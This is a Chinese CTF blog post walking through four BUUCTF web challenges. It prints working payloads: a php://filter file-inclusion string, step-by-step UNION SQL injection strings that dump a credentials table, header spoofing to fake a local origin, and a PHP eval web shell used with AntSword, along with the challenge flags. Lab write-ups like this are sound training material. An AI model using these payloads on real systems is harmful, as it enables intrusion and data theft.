---
title: Buuctf Web（9-12）
date: 2023-08-08 21:24:46
tags: CTF

---

### Buuctf Web（9-12）

#### 9、Secret File

查看源代码，有一个Archive_room.php文件

![image](https://github.com/dbqyw/qyw.github.io/assets/130265921/8f92bc8c-c00d-49e5-b321-488e99af3728)

查看该文件，有一个按钮

![image](https://github.com/dbqyw/qyw.github.io/assets/130265921/2f52ac5a-eb0a-4597-9639-8eb419803978)

点击按钮，没看到flag

![image](https://github.com/dbqyw/qyw.github.io/assets/130265921/28a170be-68bb-4f90-9875-e7bf863111a0)

从按钮处抓包，看到有一个secr3t.php文件

![image](https://github.com/dbqyw/qyw.github.io/assets/130265921/5d9d3bb9-5590-4daf-8431-6b327283fc89)

查看该文件，flag在flag.php里

![image](https://github.com/dbqyw/qyw.github.io/assets/130265921/970159db-f8ad-41b9-9a37-5fc0c5d48a0e)

查看该文件，还是没看到flag

![image](https://github.com/dbqyw/qyw.github.io/assets/130265921/ece77017-09c0-4f2e-9f32-8ec19c9a01af)

想到了PHP的封装协议，利用了filter伪协议，该协议刚好就能够查看文件包含的漏洞，所以当我们利用该协议查看flag.php时，会将它的源代码爆出来，但是因为base64的加密原因，所以我们还需要进行一次base64解密

构造payload: `/secr3t.php?file=php://filter/convert.base64-encode/resource=flag.php`

![image](https://github.com/dbqyw/qyw.github.io/assets/130265921/164dbeeb-bc18-4496-86b6-5c9324f74dfb)

看到一串base64编码，解码后得到flag

![image](https://github.com/dbqyw/qyw.github.io/assets/130265921/70bf11c6-f0cc-4c1d-912a-73bbfac52ebf)

```text
flag{657993f7-ec4c-4ccd-a411-1fbca834a5b5}
```

#### 10、LoveSQL

尝试万能密码

![image](https://github.com/dbqyw/qyw.github.io/assets/130265921/c41017b4-189d-4bb3-9734-cbe9b67f1176)

有显示

![image](https://github.com/dbqyw/qyw.github.io/assets/130265921/28f501c1-3599-4279-b421-f10026b15978)

尝试联合查询，查到3的时候回显正常

![image](https://github.com/dbqyw/qyw.github.io/assets/130265921/c732357b-32f9-4208-a8e8-1238c2ddc296)

爆数据库password=:`1' union select 1,2,database()#`

![image](https://github.com/dbqyw/qyw.github.io/assets/130265921/9e319507-1e47-4c7d-b1c3-513dfe8567dc)

爆出数据库名为geek

![image](https://github.com/dbqyw/qyw.github.io/assets/130265921/9ee2e800-9f8e-4e3c-84cd-74cc042130f7)

爆表名password=`1' union select 1,2,table_name from information_schema.tables where table_schema=database() limit 0,1#`

![image](https://github.com/dbqyw/qyw.github.io/assets/130265921/46fefaef-3e5b-4e25-879b-fe8d90e6a190)

爆出表名为geekuser

![image](https://github.com/dbqyw/qyw.github.io/assets/130265921/f86dda2c-490c-4565-9987-7debf9b563fc)

爆表名password=`1' union select 1,2,table_name from information_schema.tables where table_schema=database() limit 1,1#`

![image](https://github.com/dbqyw/qyw.github.io/assets/130265921/91e3ddbc-4172-46a3-bd4a-8475672d22ae)

爆出表名为l0ve1ysq1

![image](https://github.com/dbqyw/qyw.github.io/assets/130265921/48fad51e-7c1d-46c2-a62f-70096f1911b0)

爆列名password=`1' union select 1,2,group_concat(column_name) from information_schema.columns where table_name='l0ve1ysq1' #`

![image](https://github.com/dbqyw/qyw.github.io/assets/130265921/d75cf913-a8ff-42bc-a889-2520f7034e8a)

id,username,password

![image](https://github.com/dbqyw/qyw.github.io/assets/130265921/d4322e73-777f-41f7-a80d-216f16b92262)

爆数据：`/check.php?username=1&password=1' union select 1,2,group_concat(id,username,password) from l0ve1ysq1%23`

![image](https://github.com/dbqyw/qyw.github.io/assets/130265921/8f190d3d-18db-46dd-a153-14c2629ab419)

查看源代码，得到flag

![image](https://github.com/dbqyw/qyw.github.io/assets/130265921/847ee93b-2338-46f3-bd64-75dd2af16945)

```text
flag{7904eee7-45b3-4f8b-8eac-ecab975dac71}
```

#### 11、Http

查看页面源代码，发现有个Secret.php文件

![image](https://github.com/dbqyw/qyw.github.io/assets/130265921/fc1e582e-da71-41e3-ae68-398440843c32)

查看该文件，有一个网址

![image](https://github.com/dbqyw/qyw.github.io/assets/130265921/c8fae7de-4638-4717-894c-194b9ff5d21d)

提示：It doesn’t come from ‘https://www.Sycsecret.com’，就是说这个页面得来自https://www.Sycsecret.com，添加referer即可

```text
Referer头用于告诉web服务器，用户是从哪个页面找过来的
```

添加`Referer:https://www.Sycsecret.com`，send，提示Please use “Syclover” browser：请使用“Syclover”浏览器

![image](https://github.com/dbqyw/qyw.github.io/assets/130265921/06269527-d670-4189-8c9f-dc64374f0ec7)

```text
User-Agent头用于告诉web服务器用户使用的浏览器和操作系统信息
```

添加`User-Agent:Syclover`，send，提示No!!! you can only read this locally!!!：不! !您只能在本地阅读!!

![image](https://github.com/dbqyw/qyw.github.io/assets/130265921/b1b7a270-fb3d-4019-b4e7-6e174ce633a5)

添加`X-Forwarded-For:127.0.0.1`，send，得到flag

![image](https://github.com/dbqyw/qyw.github.io/assets/130265921/d6d19f27-7902-4f41-b3d7-741661d1f670)

```text
flag{43a4b431-f334-44b4-bcb3-aadf626871ac}
```

#### 12、Knife

使用蚁剑，安装教程[渗透工具：蚁剑教学 （安装+入门） - 知乎 (zhihu.com)](https://zhuanlan.zhihu.com/p/367151320)

构造payload：`/?<?php eval($_POST["Syc"]);?>`

打开蚁剑添加数据

URL地址为：http://1c5dc4d2-1605-4b89-99ba-90068b6d2182.node4.buuoj.cn:81/index.php

密码为：Syc


![image](https://github.com/dbqyw/qyw.github.io/assets/130265921/571e5c69-fd79-42ac-b19c-763a2829d8cd)

测试连接，连接成功，再点击添加

![image](https://github.com/dbqyw/qyw.github.io/assets/130265921/f59bd98d-4a3b-49f2-8a9c-1dcc3501da10)

右键单击，选择文件管理

![image](https://github.com/dbqyw/qyw.github.io/assets/130265921/57e65112-788b-4318-a13f-a71402bff8fa)

查看根目录，发现有个flag

![image](https://github.com/dbqyw/qyw.github.io/assets/130265921/10606a37-f6d4-4239-8dd6-d593206d2c52)

双击查看，得到flag

![image](https://github.com/dbqyw/qyw.github.io/assets/130265921/66b20406-1aeb-403e-9833-8ee8bbb16270)

```text
flag{1248bbb7-c099-4589-a699-63d87c2ec2d3}
```

